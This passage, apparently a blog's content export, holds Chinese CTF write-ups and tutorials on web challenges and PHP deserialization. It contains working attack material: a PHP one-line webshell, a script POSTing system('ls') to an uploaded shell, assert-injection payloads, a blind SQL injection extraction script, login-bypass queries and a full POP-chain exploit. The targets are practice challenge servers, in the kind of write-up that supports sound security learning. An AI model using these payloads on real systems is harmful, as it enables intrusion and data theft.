https://hackfun.org/2017/01/02/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E4%BD%A0%E9%9C%80%E8%A6%81%E7%94%A8Python%E6%9D%A5%E5%81%9ACTF/]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第七届山东省网络安全技能大赛-决赛Write-Up]]></title>
    <url>%2F2018%2F11%2F09%2F%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-%E5%86%B3%E8%B5%9BWrite-Up%2F</url>
    <content type="text"><![CDATA[第七届山东省网络安全技能大赛-决赛Write-Up ——xx_C1 前言 第一次真正意义打线下赛，学到不少东西。差点三等奖，继续努力吧。Reverse不会跳过Pwn不会跳过Webweb1打开页面：猜测抓包伪造地址。同时把admin=0改为admin=1。只说IP不在范围这个和127.0.0.1貌似没什么关系…有点坑，卡了一小会儿。 Web2 简答的审计源码 危险函数：parse_str()存在变量覆盖漏洞。把aabg7XSsMD5加密后发现是0e开头。 思路即构造?id=key[99]=QNKCDZO 发现upl04d50m3thing.php，应该是个上传的页面。 随便上传测试 下载后发现文件内容是 猜测是条件竞争，后台处理：file_put_content，然后sleep(1)，echo ‘TooSlow’ 利用burp的intruder开多线程，利用延迟来竞争。一个上传，一个访问即可。 看V0W的博客先上传一句话再利用py脚本重复访问竞争。 贴V0W代码： import requests​url = ‘http://192.168.100.243:2002/uploads/e6ce11ded480d904ea8c3b30b00a23ab9bb59119/v.php&#39;//连接根据自身情况​postdata = {‘v’: “system(‘ls’);”} //‘v’根据自身传马情况while True: r = requests.post(url,data=postdata) print r.text Web3 SSTI第二次接触。过几天总结一下。 Crypotorsa 思路一：分解大素数N(在线或yafu)，用已知的p，q，e通过模逆运算(可以直接调用pyhton里gmpy2模块的invert函数)求解e的逆元d。然后通过c的d次方对n取模的明文m。 在线直接失败（当然了比赛不能在线） yafu也失败了。 思路二：上脚本秒解(当然得稍微改改他给的txt文档把N换成n，把enc换成c) 看了看这个脚本求N的模块，挺复杂的。应该是某几种算法结合。原理我真不知道…..总之感觉有时候工具都不如py脚本好用。得好好补补python… affine 仿射变换解密。也用到了求解逆元算法..信安数基好好学挺重要… 思路一：在线 手酸-8mod26的逆元为18！(当然比赛也不能在线) 思路二：上脚本爆破解密 但是并不是所有的仿射加密都可以逆向解密，只有符合C = Ek(m) =(k1m + k2) mod n中gcd(k1, n) = 1时可以逆向解密。 看了表哥们的wp才发现flag可以是加密。当然我也不是很清楚这个仿射加密和解密怎么都是一样呢？我测试了一下换个字符串 确实是一样的。回头又仔细看了看脚本，应该是属于解密。原理是直接通过仿射函数把对应密码表换了，不用爆破就可以解密。强大！ 通过爆破知道-8的逆元是18也可以直接进行在线解密了。 MISCCrackIt kali自带破解工具：john ada binwalk查看带有一个zip，foremost分离得到加密的zip/ 然后用图片的详细信息里面的16进制转为ascii即是密码。千万记住加0x！！！比赛卡了很长时间，我说的为什么不对！！！ 神秘的文件 一看样子就是明文攻击。唉…..说多了都是泪。没网，以前的工具也找不到了….干瞪眼吧！回学校一看，就算找到工具也不行！因为压缩那一步必须是WinRar软件(压缩算法和CRC一样即可)，而我用的是Bandzip… 用ARPR进行明文攻击。保存解出的zip。 然后把docx后缀改成zip找到falg.txt base64解密即可得flag。 basic 做过类似的题目，还存这脚本。135000不能开放也不是素数。就是不知道x，y… 进制转换 比赛手撕…回来看看别人怎么写的python脚本，以后多练python….. import binascii​text = “d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e”solution = ‘’text2 = text.split(‘ ‘)for x in text2: print x if x[0] == ‘b’: #binary solution += chr(int(x[1:],2)) elif x[0] == ‘x’: # hexadecimal solution += x[1:].decode(“hex”) elif x[0] == ‘d’: # decimal solution += chr(int(x[1:])) elif x[0] == ‘o’: # octal solution += chr(int(x[1:],8))print solution colors 用StegSolve打开每一张图片查看最低位通道发现hint： 修改图片高度得到： 联想二进制，黑-&gt;1,白-&gt;0。刚好七张图片，我们联想ascii码的可打印字符是7位二进制。所以必须竖读。写(贴)个python脚本得flag： #coding:utf-8def encode(s): return ‘ ‘.join([bin(ord(c)).replace(‘0b’, ‘’) for c in s])def decode(s): return ‘’.join([chr(i) for i in [int(b, 2) for b in s.split(‘ ‘)]])​l = [‘’] * 7​f = open(‘code.txt’, ‘r’) # 01矩阵for i in range(7): j = 0 line = f.readline().replace(‘\n’,’’) l[i] = line# print l​## 矩阵初始化ll=[‘’] * 20for i in range(len(ll)): ll[i]=[‘’] * 7## 矩阵翻转for i in range(20): for j in range(7): ll[i][j] = l[j][i]# print ll​flag = ‘’for i in ll: t = ‘’.join(i) flag += decode(t) print flag Forenisc日志分析 打开发现一堆sql注入的信息 我们先url decode，这里我用的burpsuite挺方便的。这样手撕起来就比较好看了。 发现是sql盲注二分查找，根据返回404还是200直接判断就好了。25个字符还好，手撕比脚本快一点吧。 附(贴)python判断脚本 # coding:utf-8import reimport urllib​f = open(‘access.log’,’r’)lines = f.readlines()datas = []for line in lines: t = urllib.unquote(line) if ‘1765’ in t and ‘flag’ in t: # 过滤出与flag相关，正确的猜解 datas.append(t)​flag_ascii = {}for data in datas: matchObj = re.search( r’LIMIT 0,1\),(.?),1\)\)&gt;(.?) AND’, data) if matchObj: key = int(matchObj.group(1)) value = int(matchObj.group(2))+1 flag_ascii[key] = value # 使用字典，保存最后一次猜解正确的ascii码 flag = ‘’for value in flag_ascii.values(): flag += chr(value) print flag 特殊后门 提示特殊协议，过滤搜索flag找到了ICMP协议。 之后把后面的一个个手撕拼接OK。 weblogic 搜索hostname定位过滤，追踪HTTP流再搜索hostname。hint：16进制]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvisoj-web-WP]]></title>
    <url>%2F2018%2F10%2F18%2Fjarvisoj-webwp-3%2F</url>
    <content type="text"><![CDATA[WEB?这个题目一看一脸懵逼。注入扫目录都没结果。查看源码发现有俩连接很诡异。既然题目提示web？可能就在此下手了。 打开后一看是这么一堆：先找个js代码格式工具格式一下。既然是js代码就根据前端有什么就搜什么吧。 搜索Wrong Password。发现一个checkpass函数。搜索chekpass发现这么一堆： 我也不是很懂。。。谷歌后发现是一个25元方程组，利用python里面pumpy模块可以直接求解。猜测应该解出来就是password了。 得到flag。果然不是web题目。。。。 关于这个numpy模块查了一下貌似很强大，可以解很多矩阵。很多密码题目可能用到。 PHPINFO 其实一上来我以为很简单。一看这就是反序列化。之前总结过然而貌似是另外一种反序列化类型：Session序列化及反序列化处理器的安全问题。下篇文章总结一下。 根据源码理解，直接get传入phpinfo会直接能看到php设置。可能存在很多有用的信息。 然后就貌似不会了。。谷歌后发现这是：Session序列化及反序列化处理器的安全问题。其实重点在于这段代码： ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); 其意思是设置php序列化及反序列化时使用的处理器为php。 关于php处理器： PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化： 而php.ini中默认session.serialize_handler为php_serialize。这就会带来安全问题。 简单来说就是： $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize 读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 发现可以利用反序列化带入可执行数据到session中。 构造序列化值，本地搭建环境构造表单上传文件,再查询文件目录。代码如下： 在本地搭建环境访问构造的页面抓包上传我们的序列化payload。 注意要在前面加| 并且要用转译”符号。 得到了一个文件： 然后仿照上面操作访问这个文件。 得到flag。具体关于反序列化第二种情况上篇文章详细说明了。 Easy Gallery 发现有个上传页面，直接上传小马。这个马经过验证需要绕过马（这个php7.0后就不可以用了）： @eval\_r($\_POST\[sb\]) 通过在view里面输入图片ID和图片类型发现图片链接为： http://web.jarvisoj.com:32785/uploads/show.php?id=xxx&amp;type=jpg 查看源码得到绝对地址 http://web.jarvisoj.com:32785/uploads/图片ID.jpg 得到图片地址：uploads/1539874317.jpg通过url访问： http://web.jarvisoj.com:32785/index.php?page=uploads/1539874317.jpg 回显错误： 查看他给自动加上了.php。直接%00截断访问： http://web.jarvisoj.com:32785/index.php?page=uploads/1539874317.jpg%00 得到flag： 一般来讲ctf不用菜刀连接直接post命令ls可以获得flag。当然连接也可以。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Session序列化及反序列化处理器的安全问题]]></title>
    <url>%2F2018%2F10%2F18%2FSession%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[一、漏洞原理PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化。处理器对应的存储格式php键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值php_binary键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 php_serialize (php&gt;=5.5.4) 经过 serialize() 函数反序列处理的数组 php.ini中默认session.serialize_handler为php_serialize。 而PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器： session.serialize_handler “php” PHP_INI_ALL 通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据： $_SESSION[‘ryat’] = ‘|O:8:”stdClass”:0:{}’; 例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下： a:1:{s:4:”ryat”;s:20:”|O:8:”stdClass”:0:{}”;} 在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成： // var_dump($_SESSION); array(1) { [“a:1:{s:4:”ryat”;s:20:””]=&gt; object(stdClass)#1 (0) { } } 可以看到，通过注入 | 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：） 二、实际利用 i）当 session.auto_start＝On 时： 当配置选项 session.auto_start＝On，会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码： //foo.php if (ini_get(‘session.auto_start’)) { session_destroy(); } ini_set(‘session.serialize_handler’, ‘php_serialize’); session_start(); $_SESSION[‘ryat’] = $_GET[‘ryat’]; 当第一次访问该脚本，并提交数据如下： foo.php?ryat=|O:8:”stdClass”:0:{} 脚本会按照 php_serialize 处理器的序列化格式存储数据： a:1:{s:4:”ryat”;s:20:”|O:8:”stdClass”:0:{}”;} 当第二次访问该脚本时，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：） 这里需要注意的是，因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。 ii）当 session.auto_start＝Off 时： 当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码： //foo1.php ini_set(‘session.serialize_handler’, ‘php_serialize’); session_start(); $_SESSION[‘ryat’] = $_GET[‘ryat’]; //foo2.php ini_set(‘session.serialize_handler’, ‘php’); //or session.serialize_handler set to php in php.ini session_start(); class ryat { var $hi; function __wakeup() { echo ‘hi’; } function __destruct() { echo $this-&gt;hi; } } 当访问 foo1.php 时，提交数据如下： foo1.php?ryat=|O:4:”ryat”:1:{s:2:”hi”;s:4:”ryat”;} 脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象，并将会执行类中的 __wakeup 方法和 __destruct 方法：） 三、更深理解 漏洞关键在于： 1.脚本中设置的序列化处理器与php.ini设置的不同 2.两个脚本注册session使用的序列化处理器不同 （存储时序列化的和读取时反序列化的）处理器不同就会产生安全问问题。 原因： 未正确处理\\’|\\’。 比如：以php_serilize方式存入的时候，构造出”|” 伪造的序列化值存入。但之后解析又是用的php处理器的话，那么将会反序列化伪造的数据（\\’|\\’之前当作键名，\\’|\\’之后当作键值） （L.N.: php5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session）。 通过什么方式将数据注入到session中呢？ 1.开发者本身将用户可控的数据传进了session（比如joomla等） 2.通过配置不当可造成session被控。 当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$_SESSION中。 构造表单： POST一个名为PHP_SESSION_UPLOAD_PROGRESS的值，便可以将上传的文件名写入session。 test XXE L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":80,"height":132},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis OJ Web WriteUp(2)]]></title>
    <url>%2F2018%2F09%2F27%2FJarvis%20OJ%20Web%20WriteUp(2)%2F</url>
    <content type="text"><![CDATA[babyphp描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：&lt;?php if (isset($_GET[&apos;page&apos;])) { $page = $_GET[&apos;page&apos;]; } else { $page = &quot;home&quot;; } $file = &quot;templates/&quot; . $page . &quot;.php&quot;; // I heard &apos;..&apos; is dangerous! assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;); // TODO: Make this look nice assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;); ?&gt; assert函数果断是常见的危险函数。如果第一个参数是字符串会当作为代码执行。构造payload： http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls templates/;&quot;).&#39; http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;cat templates/flag.php;&quot;).&#39; 也可以利用注释掉后面的语句构造payload。 simple injection上来一脸懵逼，post注入直接上sqlmap，发现有waf。然后sqlmap绕过waf还不会。。。只能手动了。。。 常规测试: 1.先常规测试一下： username=admin&#39;# 密码随便填，发现报错密码错误。验证了没有过滤’#，而且存在报错注入。 2.然后尝试: admin&#39; order by 1# 发现说用户不存在，那么就说明有waf过滤了空格或order或by中至少一个。 3.先猜测空格吧： 把空格换成//，提示密码错误。ok绕过过滤空格。 4.测试一下万能密码： `admin’//or/**/1=1#`提示密码错误，没有过滤or。但是存在密码验证，万能密码不能用。 常见的登陆漏洞类型： ①同时验证用户名和密码： $sql = select * from users where username=$usernmae and password=$password $result = mysql_query($sql); if($result) { echo &quot;登陆成功&quot;; } else { echo &quot;登陆失败&quot;; } ②分布验证用户名和密码： $sql = &quot;select password from users where username=&apos;$username&apos;&quot; $result = mysql_query($sql); if($result) { $row = mysql_fetch_row($result); $query_password = $row[$password]; #对输入的$password进行变形 $input_password = modify($passowrd); if($input_password == $query_password) { echo &quot;登陆成功&quot;; } else { echo &quot;密码错误&quot;; } } else { echo &quot;用户不存在&quot;; }分别尝试使用： username=admin&amp;password=123456#密码错误 username=user&amp;password=123456#用户名错误即此题为分步验证。 5.开始盲注 5.1查找表： username=user&#39;/**/or/**/exists(select/**/*/**/from/**/admin)#&amp;password=123456返回密码错误，那么说明在数据库中存在admin表。 5.2查找字段： username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=123456 返回密码错误，说明admin中存在username和password字段 username=user&#39;/**/or/**/exists(select/**/count(*)/**/from/**/admin)#&amp;password=123456 返回密码错误，说明在admin表中仅仅只存在一条记录。 得到pasaword长度： username=user&#39;/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;10#&amp;password=123456，通过二分法最终发现password长度为32.即采用md5来加密的。 py脚本跑一下： # -*- coding: utf-8 -*- import requests def main(): result=&quot;&quot; url=&quot;http://web.jarvisoj.com:32787/login.php&quot; data={ &apos;username&apos;:&apos;xx&apos;, &apos;password&apos;:&apos;123456&apos; } payload=&quot;&apos;/**/or/**/ascii(substr((select/**/password/**/from/**/admin),{0},1))&gt;{1}#&quot; chars=&quot;0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot; for i in range(1,33): for j in chars: char_ascii=ord(j) sql_payload=payload.format(i,char_ascii) data[&apos;username&apos;]=sql_payload #因为注入点在username上 rep=requests.post(url=url,data=data) length=len(rep.text) if length&gt;1191: result+=j print result break print result print &quot;Done&quot; if __name__==&quot;__main__&quot;: main()得出MD5破解后登陆得flag。 在网上还流产一种解法比较骚： 常规测试后猜测： 通过用户名查询密码，然后如果查不出行就提示用户名错误，如果查出了且密码匹配不对，就提示密码错误。 然后直接用联合查询把后面带入user查询password得语句注释掉而是使用查询1： username=admin123&#39;UNION(SELECT(1))#&amp;password=123 返回密码错误，说明语句执行成功。然后尝试把密码改为1提交不正确，猜测后端使用了MD5加密进行比较。因此构造语句： username=admin123&#39;UNION(SELECT(md5(123)))#&amp;password=123 得flag。太骚啦~！！ 通过控制查询到得MD5值，再输入一个匹配得密码使其登陆成功。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反序列化漏洞的成因及利用]]></title>
    <url>%2F2018%2F09%2F27%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[接着上篇继续讲：反序列化漏洞0x01.本质无害 反序列化的数据本质上来说是没有危害的 用户可控数据进行反序列化是存在危害的 0x02.漏洞根源 根本原因:程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。 这个漏洞的形成是由于跟serialize和unserialize相关的magic函数违背正确利用的缘故。 在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。 0x03.POP链及漏洞发现技巧由于反序列化漏洞需要很多类甚至需要跨越不同的文件，所有一般只可能白盒审计才可能发现反序列化漏洞。黑盒一般发现不了，因为根本不知道内部具体的代码函数情况，不过可以想办法把源码弄到手。 默认情况下 Composer 会从 Packagist下载包,那么我们可以通过审计这些包来找到可利用的 POP链。 找PHP链的基本思路: 1.在各大流行的包中搜索 __wakeup() 和 __destruct() 函数 2.追踪调用过程(反向找，正向验证) 3.手工构造 并验证 POP 链 4.开发一个应用使用该库和自动加载机制,来测试exploit 一些对我们来说有用的POP链方法： 命令执行： 1234exec()passthru()popen()system() 文件操作： 123file_put_contents()file_get_contents()unlink() 0x03.构造exploit的思路碰到php反序列化的问题时，如果参数可控，我们要反方向去寻找，即先找到调用我们想要调用的函数或方法，然后给可控的参数赋恰当的值，逆向推理，最后得出序列化字符串。 1.寻找可能存在漏洞的应用 2.在他所使用的库中寻找 POP gadgets 3.在虚拟机中安装这些库,将找到的POP链对象序列化,在反序列化测试payload 4.将序列化之后的payload发送到有漏洞web应用中进行测试 这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果 0x04.利用反序列化漏洞利用两个条件： 1、程序中存在序列化字符串的输入点 2、程序中存在可以利用的magic函数举个例子： 源码： &lt;?php error_reporting(0); highlight_file(__FILE__); class gg { private $gg; public function __destruct() { $this-&gt;gg-&gt;get1(); } } class start { private $start1; private $start2; public function get1() { $s1 = $this-&gt;start1; $s2 = $this-&gt;start2; $s1($s2); } } class cat { private $name = &quot;蛋黄&quot;; private $color = &quot;橘色&quot;; private $weight = &quot;5公斤&quot;; public function getName() { return $this-&gt;name; } public function getColor() { return $this-&gt;color; } public function getWeight() { return $this-&gt;weight; } public function __invoke($args) { echo $args.&quot;不是函数&quot;; } } class test2 { private $a; public function __toString() { $this-&gt;a-&gt;getFlag(); } } class flag { public function getFlag() { system(&apos;cat ../flag.txt&apos;); } } $x = $_GET[&apos;x&apos;]; if (isset($x)) { unserialize($x); } ?&gt;思路： 看到 unserialize（）知道是反序列化问题 从后往前逆推 1)想要得到flag 必须得调用flag 类里面的 getflag()方法 2)往上看，发现test2 里面调用了getflag()方法 3)但是这个getflag是a对应的方法，所以必须把a赋值为flag的类并且，getflag()函数在tostring 里面，所以要把test2类当作一个字符串来使用 4)上面cat 方法里面有关于字符串的调用，所以可以把args 赋为text2 的新类，但是想要调用echo 语句，必须得调用 invoke方法，所以呢，要把cat 当作一个函数来使用 5） 向上寻找函数的调用，发现start 里面有关于函数的调用，所以应该把s1赋值为cat的类，而s2 是函数的参数，联想到上面的__revoke，所以，可以把$s2赋值为test2的类 6)想要实现上述，必须调用get1()方法，向上寻找，发现gg类中调用了get1()，但是却是变量gg的 方法，所以将变量gg赋值为start的类，就可以调用get1()方法了 payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?phpclass gg&#123; private $gg; public function __construct() &#123; $this-&gt;gg = new start(); &#125; public function __destruct() &#123; $this-&gt;gg-&gt;get1(); &#125;&#125;class start&#123; private $start1; private $start2; public function __construct() &#123; $this-&gt;start1 = new cat(); $this-&gt;start2=new test2(); &#125; public function get1() &#123; $s1 = $this-&gt;start1; $s2 = $this-&gt;start2; $s1($s2); &#125;&#125;class cat&#123; private $name = "蛋黄"; private $color = "橘色"; private $weight = "5公斤"; public function getName() &#123; return $this-&gt;name; &#125; public function getColor() &#123; return $this-&gt;color; &#125; public function getWeight() &#123; return $this-&gt;weight; &#125; public function __invoke($args) &#123; echo $args."不是函数"; &#125;&#125;class test2&#123; private $a; public function __construct() &#123; $this-&gt;a = new flag(); &#125; public function __toString() &#123; $this-&gt;a-&gt;getFlag(); &#125;&#125;class flag&#123; public function getFlag() &#123; system('cat ../flag.txt'); &#125;&#125;$b = new gg;echo urlencode(serialize($b))."&lt;br / &gt;";?&gt; 正向理思路： 1.首先选创建一个新类gg，销毁时调用方__destruct，调用get1() 2.get1()中，s1 是cat的新类，s2是test2的新类，s1当作函数，调用__invoke,s2 当作字符串，调用__tostring 3.然后调用__tostring,中的getflag(),执行system(),获得flag]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[序列化、反序列化的理解]]></title>
    <url>%2F2018%2F09%2F27%2F%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[之前看过反序列化的漏洞，不算是很系统。昨天和小伙伴正好遇到了一道反序列化的题目，借此总结一下。分俩个部分： 1.序列化、反序列化的理解 2.反序列化漏洞的成因及利用 1.序列化、反序列化的理解0x01什么是序列化？ 序列化： 将数据结构或对象转换成字节序列、二进制串的过程。 反序列化：将在序列化过程中所生成的二进制串转换成数据结构或者对象的过程。 注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。 0x02用处序列化是让对象脱离运行环境的一种手段,可以有效的实现多平台之间的通信、对象持久化存储。 序列化成字节序列后，便于保存在内存、文件、数据库中，也可以理解为：序列化是指将一个对象转换成一个字符串，如： 1O:7:"Logfile":1: &#123;s:8:"filename";s:10:"source.txt" ;&#125; 0x03函数Java：ObjectOutputStream类的writeObject()、 readObject() PHP：serialize()、Unserialize()0x04php序列字符串的模型意义a - array 数组 b - boolean布尔型 d - double双精度型 i - integer o - common object一般对象 r - reference s - string C - custom object 自定义对象 O - class N - null R - pointer reference U - unicode string unicode编码的字符串0x05使用场景1) 一般来说，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将session信息保存起来放在硬盘，服务器重启后，又重新加载。这样就保证了用户信息不会丢失，实现永久化保存。 2) 在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便减轻内存压力或便于长期保存。 比如： 最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。 以下都可能需要使用序列化： • http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等 • Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed） • xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application/xml） • json(Jackson，fastjson) http请求中0x06PHP中的magic函数magic函数以_开头。在特定的条件下会自动执行这些magic函数的内容，比如创建、销毁对象的时候。 1construct(), destruct() 构造函数与析构函数，创建类销毁类时自动调用。 1call(), callStatic() 方法重载的两个函数 __call()是在对象上下文中调用不可访问的方法时触发 __callStatic()是在静态上下文中调用不可访问的方法时触发。 1get(), set() __get()用于从不可访问的属性读取数据。 __set()用于将数据写入不可访问的属性。 1isset(), unset() __isset()在不可访问的属性上调用isset()或empty()触发。 __unset()在不可访问的属性上使用unset()时触发。 1sleep(), wakeup() serialize()检查您的类是否具有魔术名sleep()的函数。如果是这样，该函数在任何序列化之前执行。它可以清理对象，并且应该返回一个数组，其中应该被序列化的对象的所有变量的名称。如果该方法不返回任何内容，则将NULL序列化并发出E_NOTICE。sleep()的预期用途是提交挂起的数据或执行类似的清理任务。此外，如果有非常大的对象，不需要完全保存，该功能将非常有用。 unserialize()使用魔术名wakeup()检查函数的存在。如果存在，该功能可以重构对象可能具有的任何资源。wakeup()的预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。 1__toString() __toString（）方法允许一个类决定如何处理像一个字符串时它将如何反应。 1__invoke() 当脚本尝试将对象调用为函数时，调用__invoke()方法。 123__set_state()__clone()__debugInfo()]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis OJ Web WriteUp(1)]]></title>
    <url>%2F2018%2F09%2F26%2FJarvis%20OJ%20Web%20WriteUp(1)%2F</url>
    <content type="text"><![CDATA[PORT51一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。1curl --ocal-port http://xxx.com之前没有接触过curl，只是在docker里面用过一次。1curl就是：在linux中一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 由于安装linux的时候很多时候是没有安装桌面的，也意味着没有浏览器，因此这个方法也经常用于测试一台服务器是否可以到达一个网站。 当然也可以进行ip伪造等等测试操作。 LOCALHOSTburp抓包添加头 1X-Forwarded-For: 127.0.0.1 Login抓包后发现Hint： 1"select * from 'admin' where password='".md5($pass,true)."'" 首先想到MD5注入。 具体原理： 提价传入的password如果是特殊字符串，那么该字符串转化为MD5再经过PHP转化为字符串后变成： &#39;or&#39;6蒥欓!r,b 那么最后的sql语句则变成： select * fromadminwhere password=&#39;&#39;or&#39;6蒥欓!r,b&#39; 即成功闭合了’ bypass成功。 神盾局的秘密发现url里面有base64编码。猜测是利用base64访问任意文件。 分别读取index.php，shield.php。审计源码发现存在反序列化漏洞。 通过脚本： 1234567&lt;?php class Shield &#123; public $file = "pctf.php"; &#125; $chybeta = new Shield(); print_r(serialize($chybeta));?&gt; 生成序列化串： 1O:6:"Shield":1:&#123;s:4:"file";s:8:"pctf.php";&#125;` 访问： 1http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125; 查看源码得flag IN A Mess右键源码发现注释Hint： index.phps 访问后,发现源码： 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123;header('Location: index.php?id=1');exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi ("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder! harder!";&#125;?&gt; 